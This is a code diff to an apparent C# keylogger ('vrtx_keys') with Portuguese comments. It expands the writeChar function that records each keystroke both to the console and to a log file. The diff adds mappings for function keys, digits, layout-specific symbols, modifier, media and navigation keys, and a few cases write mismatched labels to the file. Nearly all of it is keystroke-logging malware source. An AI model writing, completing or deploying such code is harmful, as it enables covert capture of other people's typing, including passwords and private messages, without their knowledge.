@@ -45,16 +45,247 @@ namespace vrtx_keys {
         private static void writeChar(int vkCode) {
             using(StreamWriter output = File.AppendText(FILEPATH)) {
                 switch(((Keys)vkCode).ToString()) {
-                    case "Capital":
-                    case "LShiftKey":
-                    case "RShiftKey":
+                    case "F1":
+                    case "F2":
+                    case "F3":
+                    case "F4":
+                    case "F5":
+                    case "F6":
+                    case "F7":
+                    case "F8":
+                    case "F9":
+                    case "F10":
+                    case "F11":
+                    case "F12":
+                        Console.Out.Write("{" + (Keys)vkCode + "}");
+                        output.Write("{" + (Keys)vkCode + "}");
                         break;
 
+                    //tratar shift
+                    case "D1":
+                    case "D2":
+                    case "D3":
+                    case "D4":
+                    case "D5":
+                    case "D6":
+                    case "D7":
+                    case "D8":
+                    case "D9":
+                    case "D0":
+                        Console.Out.Write(((Keys)vkCode).ToString().Substring(1));
+                        output.Write(((Keys)vkCode).ToString().Substring(1));
+                        break;
+
+                    //tratar shift e caps
+                    case "Oem1":
+                        Console.Out.Write("ç");
+                        output.Write("ç");
+                        break;
+
+                    //tratar shift e altgr
+                    case "Oem5":
+                        Console.Out.Write("]");
+                        output.Write("]");
+                        break;
+
+                    //tratar shift e altgr
+                    case "Oem6":
+                        Console.Out.Write("[");
+                        output.Write("[");
+                        break;
+
+                    //tratar shift e acentuação
+                    case "Oem7":
+                        Console.Out.Write("{WIP}");
+                        output.Write("{WIP}");
+                        break;
+
+                    //tratar shift e acentuação
+                    case "OemOpenBrackets":
+                        Console.Out.Write("{WIP}");
+                        output.Write("{WIP}");
+                        break;
+
+                    //tratar shift
+                    case "OemBackslash":
+                        Console.Out.Write("\\");
+                        output.Write("\\");
+                        break;
+
+                    //tratar shift
+                    case "OemQuestion":
+                        Console.Out.Write(";");
+                        output.Write(";");
+                        break;
+
+                    //tratar shift
+                    case "Oemtilde":
+                        Console.Out.Write("'");
+                        output.Write("'");
+                        break;
+
+                    //tratar shift
+                    case "OemMinus":
+                        Console.Out.Write("-");
+                        output.Write("-");
+                        break;
+
+                    //tratar shift e altgr
+                    case "Oemplus":
+                        Console.Out.Write("=");
+                        output.Write("=");
+                        break;
+
+                    case "Home":
+                        Console.Out.Write("{HOME}");
+                        output.Write("{HOME}");
+                        break;
+
+                    case "End":
+                        Console.Out.Write("{END}");
+                        output.Write("{END}");
+                        break;
+
+                    case "PageUp":
+                        Console.Out.Write("{PGUP}");
+                        output.Write("{PGUP}");
+                        break;
+
+                    //nao tenho ctz mas acho que esse é o pagedown
+                    case "Next":
+                        Console.Out.Write("{PGDOWN}");
+                        output.Write("{PGDOWN}");
+                        break;
+
+                    case "VolumeMute":
+                        Console.Out.Write("{VOLMUTE}");
+                        output.Write("{VOLMUTE}");
+                        break;
+
+                    case "VolumeUp":
+                        Console.Out.Write("{VOLUP}");
+                        output.Write("{VOLUP}");
+                        break;
+
+                    case "VolumeDown":
+                        Console.Out.Write("{VOLDOWN}");
+                        output.Write("{VOLDOWN}");
+                        break;
+
+
+                    case "MediaPreviousTrack":
+                        Console.Out.Write("{MPREVTRACK}");
+                        output.Write("{MPREVTRACK}");
+                        break;
+
+                    case "MediaPlayPause":
+                        Console.Out.Write("{MPLAYTRACK}");
+                        output.Write("{MPREVTRACK}");
+                        break; 
+
+                    case "MediaNextTrack":
+                        Console.Out.Write("{MNEXTRACK}");
+                        output.Write("{MNEXTRACK}");
+                        break;
+
+                    case "BrowserSearch":
+                        Console.Out.Write("{BRWRSEARCH}");
+                        output.Write("{BRWRSEARCH}");
+                        break;
+
+                    case "LButton, OemClear":
+                        Console.Out.Write("{BRIGHT_CONEC}");
+                        output.Write("{BRIGHT_CONEC}");
+                        break;
+                        
+                    case "Back":
+                        Console.Out.Write("{BCKSP}");
+                        output.Write("BCKSP");
+                        break;
+
+                    case "Capital":
+                        Console.Out.Write("{CAPS}");
+                        output.Write("{CAPS}");
+                        break;
+
+                    case "LShiftKey":
+                        Console.Out.Write("{LSHIFT}");
+                        output.Write("{LSHIFT}");
+                        break;
+
+                    case "RShiftKey":
+                        Console.Out.Write("{RSHIFT}");
+                        output.Write("{RSHIFT}");
+                        break;
+
+                    case "LControlKey":
+                        Console.Out.Write("{LCONTROL}");
+                        output.Write("{LCONTROL}");
+                        break;
+
+                    case "RControlKey":
+                        Console.Out.Write("{RCONTROL}");
+                        output.Write("{RCONTROL}");
+                        break;
+
+                    case "LWin":
+                        Console.Out.Write("{LWIN}");
+                        output.Write("{LWIN}");
+                        break;
+
+                    case "left":
+                        Console.Out.Write("{ALEFT}");
+                        output.Write("{ALEFT}");
+                        break;
+
+                    case "right":
+                        Console.Out.Write("{ARIGHT}");
+                        output.Write("{ARIGHT}");
+                        break;
+
+                    case "up":
+                        Console.Out.Write("{AUP}");
+                        output.Write("{AUP}");
+                        break;
+
+                    case "down":
+                        Console.Out.Write("{ADOWN}");
+                        output.Write("{ADOWN}");
+                        break;
+
+                    case "Escape":
+                        Console.Out.Write("{ESC}");
+                        output.Write("{ESC}");
+                        break;
+
+                    case "PrintScreen":
+                        Console.Out.Write("{PRTSCR}");
+                        output.Write("{PRTSCR}");
+                        break;
+
+                    case "Insert":
+                        Console.Out.Write("{INS}");
+                        output.Write("{INS}");
+                        break;
+
+                    case "Delete":
+                        Console.Out.Write("{DEL}");
+                        output.Write("{DEL}");
+                        break;
+
+                    //tratar shift e altgr
+                    case "LButton, Oemtilde":
+                        Console.Out.Write("/");
+                        output.Write("/");
+                        break;
+
+                    //tratar shift e altgr
                     case "Oemcomma":
                         Console.Out.Write(",");
                         output.Write(",");
                         break;
 
+                    //tratar shift e altgr
                     case "OemPeriod":
                         Console.Out.Write(".");
                         output.Write(".");
@@ -71,8 +302,8 @@ namespace vrtx_keys {
                         break;
 
                     case "Tab":
-                        Console.Out.Write("    ");
-                        output.Write("    ");
+                        Console.Out.Write("{TAB}");
+                        output.Write("{TAB}");
                         break;
 
                     default:
